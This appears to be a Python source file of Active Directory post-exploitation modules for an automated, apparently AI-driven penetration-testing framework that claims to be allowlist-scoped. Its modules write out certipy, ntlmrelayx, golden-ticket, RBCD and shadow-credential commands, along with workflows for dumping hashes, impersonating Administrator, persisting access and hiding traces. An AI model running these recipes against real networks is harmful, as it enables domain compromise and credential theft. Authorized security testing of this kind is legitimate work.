"""Attack modules: Active Directory post-exploit (Phase 1).

Recipe/orchestration modules that wrap the permissive MCP AD tools in
``tools/mcp_tools/ad.py`` (adcs_enum, bloodhound_collect, responder_relay,
golden_ticket, smb_signing_check). They are NOT re-implementations: the
generated workflows connect ONLY to ``ctx.target_ip`` (the single owned
target) and the MCP layer enforces the target-IP allowlist lock. They follow
the same ``status="info"`` recipe pattern as ``DCSyncAttack``/``ASREPRoast``.
``SMBSigningCheck`` is detection-only.
"""

from __future__ import annotations

from typing import Any

from tools.attack_modules.base import AttackModule, ModuleContext


class ADCSEnum(AttackModule):
    name = "ADCSEnum"
    description = (
        "Enumerate Active Directory Certificate Services (AD CS) templates to find ESC1-8 privesc paths (certipy)"
    )
    target_services = ["ldap", "msrpc", "microsoft-ds"]
    target_ports = [389, 3268, 445]
    required_cves: list[str] = []
    # Capability metadata: AD CS enumeration is read-only; requires domain
    # credentials to bind. Surfaces ESC1-8 misconfig findings (no artifact kind
    # -- the certipy JSON is operator-collected, not a planner artifact).
    requires: list[str] = ["credentials"]
    produces: list[str] = []
    read_only = True
    cost = "medium"
    phase_hint = "enumerate"

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        return self._info_result(
            ctx,
            note="Wraps the adcs_enum MCP tool (certipy find). Maps ESC1-8 misconfigurations to privesc/credential-theft paths.",
            evidence=[f"AD CS enumeration planned against {ctx.target_ip} (requires domain creds)"],
            references=[
                "https://github.com/ly4k/Certipy",
                "https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf",
            ],
            suggested_command=(
                f"certipy find -u user@DOMAIN -p password -dc-ip {ctx.target_ip} -target {ctx.target_ip} -vulnerable"
            ),
            workflow=[
                "1. Obtain domain credentials (recovered via ASREPRoast / Kerberoasting / a credential dump on the owned target).",
                f"2. Call adcs_enum(target_ip='{ctx.target_ip}', username=<u>, domain=<d>, password=<p> or ntlm_hash=<nt>) to enumerate AD CS templates.",
                "3. Classify vulnerable templates: ESC1/6 -> PassTheHash (after certipy auth); ESC4 -> re-enroll as template owner -> PtH; ESC8 -> ResponderRelay against http://<ca>/certsrv; ESC2/3 -> certipy req -> PtH.",
                "4. Chain to PassTheHash / ResponderRelay / GoldenTicket against the owned target only.",
            ],
        )


class BloodHoundCollect(AttackModule):
    name = "BloodHoundCollect"
    description = (
        "Collect BloodHound graph data (users/groups/sessions/ACLs) for attack-path analysis (bloodhound-python)"
    )
    target_services = ["ldap", "kerberos", "microsoft-ds"]
    target_ports = [389, 445, 88]
    required_cves: list[str] = []
    # Capability metadata: BloodHound collection is read-only graph export;
    # requires any domain credential to bind. The zipped JSON is operator-
    # consumed, not a planner artifact.
    requires: list[str] = ["credentials"]
    produces: list[str] = []
    read_only = True
    cost = "medium"
    phase_hint = "enumerate"

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        return self._info_result(
            ctx,
            note="Wraps the bloodhound_collect MCP tool (bloodhound-python -c All --zip). Feeds attack-path planning.",
            evidence=[f"BloodHound collection planned against {ctx.target_ip} (requires domain creds)"],
            references=[
                "https://github.com/dirkjanm/BloodHound.py",
                "https://github.com/BloodHoundAD/BloodHound",
            ],
            suggested_command=(f"bloodhound-python -u user -p pass -d DOMAIN -dc {ctx.target_ip} -c All --zip"),
            workflow=[
                "1. Obtain any domain credential (even a low-priv domain user suffices for collection).",
                f"2. Call bloodhound_collect(target_ip='{ctx.target_ip}', domain=<d>, username=<u>, password=<p>) to gather the graph dataset.",
                "3. Import the zipped JSON into BloodHound on the operator box; run 'Shortest Paths to Domain Admin' / 'Kerberoastable' / 'DCSync-able' queries.",
                "4. Feed identified paths: Kerberoastable -> Kerberoasting; AS-REP-Roastable -> ASREPRoast; DCSync-able -> DCSyncAttack; Shortest Paths -> LateralMovement.",
            ],
        )


class ResponderRelay(AttackModule):
    name = "ResponderRelay"
    description = "SMB/NTLM relay via impacket ntlmrelayx (relay targets restricted to the operator allowlist)"
    target_services = ["microsoft-ds", "smb", "netbios-ssn"]
    target_ports = [445, 139]
    required_cves: list[str] = []
    # Capability metadata: NTLM relay captures hashes / executes commands on
    # the relay target, producing credential artifacts (SAM hashes). Not
    # read-only. No artifact prerequisite -- the coerced auth is an operator
    # step (SMB signing should be off; check via SMBSigningCheck).
    requires: list[str] = []
    produces: list[str] = ["hash_artifact", "credentials"]
    read_only = False
    cost = "high"
    phase_hint = "exploit"

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        return self._info_result(
            ctx,
            note=(
                "Wraps the responder_relay MCP tool. Relay targets are built ONLY "
                "from the allowlist (+ runtime target); off-list hosts are refused. "
                "Linux-attacker only (ntlmrelayx); poisoning (responder) is a "
                "separate operator step, not provided as an MCP tool."
            ),
            evidence=[f"NTLM relay planned against {ctx.target_ip} (signing state unverified)"],
            references=[
                "https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py",
                "https://www.thehacker.recipes/a-d/movement/ntlm/relay",
            ],
            suggested_command=(
                f"ntlmrelayx.py -tf targets.txt -smb2support -c 'whoami'  # targets.txt built from allowlist + {ctx.target_ip}"
            ),
            prerequisites=["SMB signing disabled on the relay target", "a coerced auth to the operator listener"],
            workflow=[
                "0. Run smb_signing_check on each allowlisted relay candidate; drop signing-required hosts.",
                f"1. Call responder_relay(target_ip='{ctx.target_ip}', iface=<op_iface>) to start ntlmrelayx bound to the operator interface.",
                "2. Coerce an authentication to your listener (e.g. via a coerced HTTP/PetitPotam request from the owned target).",
                "3. ntlmrelayx dumps SAM (no -c) or executes the command (-c) against an allowlisted relay target only.",
            ],
        )


class GoldenTicket(AttackModule):
    name = "GoldenTicket"
    description = "Mint a Kerberos golden ticket (TGT) from a stolen krbtgt NTLM hash for persistence / full-domain impersonation (impacket-ticketer)"
    target_services = ["kerberos", "ldap", "microsoft-ds", "drsuapi"]
    target_ports = [88, 389, 445, 3268]
    required_cves: list[str] = []
    # Capability metadata: golden ticket requires the krbtgt NTLM hash +
    # domain SID (recovered via DCSync, which itself requires admin_priv). The
    # forged TGT is a credential artifact granting domain-wide access. This is
    # the escalate / domain-persistence step.
    requires: list[str] = ["admin_priv", "hash_artifact"]
    produces: list[str] = ["credentials", "foothold"]
    read_only = False
    cost = "medium"
    phase_hint = "escalate"

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        return self._info_result(
            ctx,
            note=(
                "Wraps the golden_ticket MCP tool (impacket-ticketer). Requires "
                "the krbtgt NTLM hash + domain SID (recovered via DCSync). A "
                "golden ticket IS domain admin -- any username works (even "
                "non-existent) because the TGT is forged."
            ),
            evidence=[f"golden ticket minting planned against {ctx.target_ip} (krbtgt hash required)"],
            references=[
                "https://github.com/fortra/impacket/blob/master/examples/ticketer.py",
                "https://adsecurity.org/?p=1729",
            ],
            suggested_command=(
                f"impacket-ticketer -nthash <krbtgt_nt> -domain DOMAIN -domain-sid S-1-5-... "
                f"-user Administrator -duration 10d Administrator  # then psexec -k {ctx.target_ip}"
            ),
            prerequisites=["krbtgt NTLM hash (via DCSync)", "domain SID"],
            confidence=0.4,
            workflow=[
                "1. Obtain the krbtgt NTLM hash + domain SID: dump_credentials(method='dcsync', target_user='krbtgt') against the owned DC; parse S-1-5-21-... from the secretsdump output.",
                f"2. Call golden_ticket(target_ip='{ctx.target_ip}', domain=<d>, username=<any_user>, krbtgt_hash=<nt>, sid=<domain_sid>) to mint the TGT.",
                "3. export KRB5CCNAME=<ccache> and use the ticket with impacket-psexec -k -no-pass against the owned target only.",
                "4. The ticket persists domain access until the krbtgt password is rotated (twice).",
            ],
        )


class SMBSigningCheck(AttackModule):
    """DETECTION ONLY — never exploits. Checks SMB signing posture to decide
    whether relay (ResponderRelay) is viable against the target."""

    name = "SMBSigningCheck"
    description = "DETECTION ONLY: check whether the target requires SMB signing (relay feasibility)"
    target_services = ["microsoft-ds", "smb", "netbios-ssn"]
    target_ports = [445, 139]
    required_cves: list[str] = []
    # Capability metadata: detection-only SMB signing posture check; no
    # credentials sent, no exploitation. Read-only enumeration that gates the
    # ResponderRelay / SMBRelay decision.
    requires: list[str] = []
    produces: list[str] = []
    read_only = True
    cost = "low"
    phase_hint = "enumerate"

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        return self._info_result(
            ctx,
            note=(
                "Detection-only. Wraps the smb_signing_check MCP tool (nxc "
                "--signing or nmap smb2-security-mode). No credentials sent, no "
                "exploitation. Works on both attacker OSes (nmap fallback)."
            ),
            evidence=[f"SMB signing check planned against {ctx.target_ip}"],
            references=[
                "https://www.thehacker.recipes/a-d/movement/ntlm/relay",
            ],
            suggested_command=f"nxc smb {ctx.target_ip} --signing",
            workflow=[
                f"1. Call smb_signing_check(target_ip='{ctx.target_ip}').",
                "2. If signing is NOT required -> ResponderRelay / SMBRelay are viable (allowlist-gated).",
                "3. If signing IS required -> relay attacks will fail; pivot to Kerberoasting / AS-REP roasting / PtH instead.",
            ],
        )


class RBCDAttack(AttackModule):
    name = "RBCDAttack"
    description = (
        "Resource-Based Constrained Delegation: abuse GenericWrite/WriteOwner on a computer object "
        "to configure msDS-AllowedToActOnBehalfOfOtherIdentity, then impersonate any domain user "
        "(impacket rbcd + getST)"
    )
    target_services = ["ldap", "kerberos", "microsoft-ds"]
    target_ports = [389, 636, 3268, 88, 445]
    required_cves: list[str] = []
    # Capability metadata: RBCD needs a controlled principal (owned machine
    # account via MachineAccountQuota, or an existing account we have creds
    # for) plus GenericWrite/WriteOwner on the target computer (found via
    # BloodHoundCollect). Impersonating a domain admin yields admin-equivalent
    # access; the forged service ticket is a credential artifact.
    requires: list[str] = ["credentials"]
    produces: list[str] = ["credentials", "foothold"]
    read_only = False
    cost = "high"
    phase_hint = "escalate"

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        return self._info_result(
            ctx,
            note=(
                "Abuses resource-based constrained delegation: with write access "
                "over a computer object, set msDS-AllowedToActOnBehalfOfOtherIdentity "
                "to a controlled principal, then S4U2self/S4U2proxy (getST) to "
                "impersonate a privileged user. No domain-admin rights needed -- "
                "only GenericWrite/WriteOwner on the target computer plus one "
                "controlled account."
            ),
            evidence=[
                f"RBCD attack planned against {ctx.target_ip} (GenericWrite path + controlled principal required)"
            ],
            references=[
                "https://github.com/fortra/impacket/blob/master/examples/rbcd.py",
                "https://github.com/fortra/impacket/blob/master/examples/getST.py",
                "https://www.thehacker.recipes/a-d/persistence/sid-history",
            ],
            suggested_command=(
                f"impacket-rbcd -dc-ip {ctx.target_ip} -t TARGET$ -f CONTROLLED$ 'DOMAIN/user:password' -action write "
                f"&& impacket-getST -spn cifs/{ctx.target_ip} -impersonate Administrator -dc-ip {ctx.target_ip} 'DOMAIN/CONTROLLED$:password'"
            ),
            prerequisites=[
                "domain credentials (any low-priv user suffices to start)",
                "GenericWrite/WriteOwner/GenericAll on the target computer (find via BloodHoundCollect)",
                "a controlled principal: existing owned account, or a new machine account (MachineAccountQuota > 0)",
            ],
            privilege_level="admin",
            workflow=[
                "1. Run BloodHoundCollect; query for outbound GenericWrite/WriteOwner/GenericAll edges onto computer objects.",
                f"2. Secure a controlled principal: reuse an owned account, or add a machine account against {ctx.target_ip} (addcomputer.py when MachineAccountQuota allows).",
                "3. Write the delegation: impacket-rbcd -action write with -t <target$> -f <controlled$> via run_exploit_terminal (allowlist-locked).",
                "4. Impersonate: impacket-getST -spn cifs/<target> -impersonate Administrator; export KRB5CCNAME=<ccache>.",
                "5. Use the ticket: lateral_exec / PassTheHash against the owned target only; cred_store_add any recovered hashes.",
            ],
        )


class ShadowCredentials(AttackModule):
    name = "ShadowCredentials"
    description = (
        "Shadow Credentials (Key Credentials): abuse GenericWrite on a user/computer object "
        "to add key credentials, then PKINIT-authenticate as the victim and recover its NT hash "
        "(certipy shadow / pywhisker)"
    )
    target_services = ["ldap", "kerberos"]
    target_ports = [389, 636, 3268, 3269, 88]
    required_cves: list[str] = []
    # Capability metadata: needs GenericWrite/GenericAll on the victim account
    # (found via BloodHoundCollect) plus any domain credential to bind. Yields
    # the victim's NT hash -- a credential/hash artifact. Victim choice drives
    # impact: a DA victim means domain compromise.
    requires: list[str] = ["credentials"]
    produces: list[str] = ["hash_artifact", "credentials"]
    read_only = False
    cost = "medium"
    phase_hint = "escalate"

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        return self._info_result(
            ctx,
            note=(
                "Adds attacker-controlled key credentials (msDS-KeyCredentialLink) "
                "to a victim account you hold GenericWrite over, then authenticates "
                "via PKINIT (certipy shadow auto) to recover the victim's NT hash. "
                "Works against users AND computers; no password change, no service "
                "disruption."
            ),
            evidence=[f"shadow-credentials attack planned against {ctx.target_ip} (GenericWrite on victim required)"],
            references=[
                "https://github.com/ly4k/Certipy",
                "https://github.com/eladshamir/Whisker",
                "https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab",
            ],
            suggested_command=(
                f"certipy shadow auto -u user@DOMAIN -p password -dc-ip {ctx.target_ip} -target {ctx.target_ip} -account VICTIM"
            ),
            prerequisites=[
                "domain credentials (any low-priv user suffices to start)",
                "GenericWrite/GenericAll on the victim user/computer (find via BloodHoundCollect)",
            ],
            workflow=[
                "1. Run BloodHoundCollect; query for outbound GenericWrite/GenericAll edges onto high-value users/computers.",
                f"2. Add key credentials: certipy shadow auto -u <u>@<domain> -p <p> -dc-ip {ctx.target_ip} -account <victim> via run_exploit_terminal (allowlist-locked).",
                "3. certipy recovers the victim NT hash via PKINIT -- cred_store_add the hash immediately.",
                "4. PassTheHash / lateral_exec as the victim against the owned target only; remove the key credential afterwards to restore stealth.",
            ],
        )


class ESCChain(AttackModule):
    name = "ESCChain"
    description = (
        "AD CS enrollment exploitation: turn ADCSEnum ESC2/3/4/6/8 findings into certificates "
        "via certipy req/auth, then recover NT hashes for pass-the-hash (ESC8 relays via ResponderRelay)"
    )
    target_services = ["ldap", "msrpc", "microsoft-ds", "http"]
    target_ports = [389, 3268, 445, 443]
    required_cves: list[str] = []
    # Capability metadata: the execution half of ADCSEnum (which only
    # enumerates). Needs domain credentials plus a vulnerable template finding
    # from ADCSEnum. Yields the victim's NT hash -- a credential/hash artifact
    # feeding PassTheHash / lateral_exec.
    requires: list[str] = ["credentials"]
    produces: list[str] = ["credentials", "hash_artifact"]
    read_only = False
    cost = "high"
    phase_hint = "exploit"

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        return self._info_result(
            ctx,
            note=(
                "Executes the enrollment paths ADCSEnum only reports: request a "
                "certificate as/impersonating the victim (ESC1/2/3/6), re-enroll a "
                "template you own (ESC4), or relay HTTP enrollment (ESC8), then "
                "certipy auth to recover the NT hash. ESC8 needs SMB signing OFF "
                "on the relay target (check via SMBSigningCheck)."
            ),
            evidence=[
                f"ESC enrollment attack planned against {ctx.target_ip} (vulnerable template + domain creds required)"
            ],
            references=[
                "https://github.com/ly4k/Certipy",
                "https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf",
            ],
            suggested_command=(
                f"certipy req -u user@DOMAIN -p password -dc-ip {ctx.target_ip} -target {ctx.target_ip} "
                "-ca CA-NAME -template VULN-TEMPLATE -upn victim@domain "
                f"&& certipy auth -pfx victim.pfx -dc-ip {ctx.target_ip}"
            ),
            prerequisites=[
                "domain credentials (recovered via ASREPRoast / Kerberoasting / credential dump)",
                "ADCSEnum finding: a vulnerable template (ESC1/2/3/4/6) or an HTTP enrollment endpoint (ESC8)",
                "ESC8 only: SMB signing disabled on the relay target (SMBSigningCheck)",
            ],
            workflow=[
                f"1. Call adcs_enum(target_ip='{ctx.target_ip}', ...) and classify the vulnerable template (ESC1/2/3/4/6) or HTTP endpoint (ESC8).",
                "2a. ESC1/2/3/6: certipy req (-upn/-dns as the victim per template) then certipy auth -pfx to recover the NT hash.",
                "2b. ESC4: rewrite the template as owner, then follow 2a; restore the template afterwards.",
                "2c. ESC8: start ResponderRelay, coerce HTTP auth to the listener, relay to http(s)://<ca>/certsrv/certfnsh.asp.",
                "3. cred_store_add the recovered NT hash; PassTheHash / lateral_exec against the owned target only.",
            ],
        )
